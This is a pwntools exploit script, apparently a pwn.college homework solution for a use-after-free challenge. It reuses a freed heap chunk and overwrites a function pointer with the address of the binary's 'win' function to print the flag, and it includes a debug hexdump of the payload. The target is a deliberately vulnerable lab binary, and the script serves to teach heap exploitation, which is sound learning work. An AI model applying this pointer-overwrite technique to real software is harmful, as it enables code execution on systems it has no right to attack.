# Username: vasanth.vanan (pwn.college dojos)
# Title: Homework challenge on Use-After-Free vulnerability

# imported the 'pwntools' library
from pwn import *

# path to the binary file
binary_path = "./homework"

# assigned the context for the binary analysis to get the context of the binary.
context.binary = elf = ELF(binary_path, checksec=False)

context.log_level = 'DEBUG'

# created a local process
p = process()

# called recvuntil() and sendline() to receive and send the payloads
p.recvuntil(b'act?')
p.sendline(b'AAAAAAAA')

# found the address of 'win' function and 'TellAJoke' instruction from the GDB debugging.
# 2 freed chunk size (0x60 and 0x90) was found in the heap. Utilised the second one, 0x90 (144). Note that the code adds 8 bytes 
# along with the input and some random metadata is allocated in the chunk. so, payload becomes 144-16 = 128
p.recvuntil(b'to be?')
p.sendline(b'128')
p.readline()

# calculated the offset from the chunk address to 'TellAJoke' (RAX-0x60) address and overwriting it with the address of 'win' function.
# 256 - 16 (metadata) = 240
p.sendline(b'A' * 240 + p64(elf.symbols.win))
# [DEBUG] Sent 0xf9 bytes:
#     00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
#     *
#     000000f0  ed 0b 40 00  00 00 00 00  0a                        │··@·│····│·│
#     000000f9

# chose the right switch case
p.recvuntil(b'Action: ')
p.sendline(b'1')

# received the flag and printed it
print(p.readline())
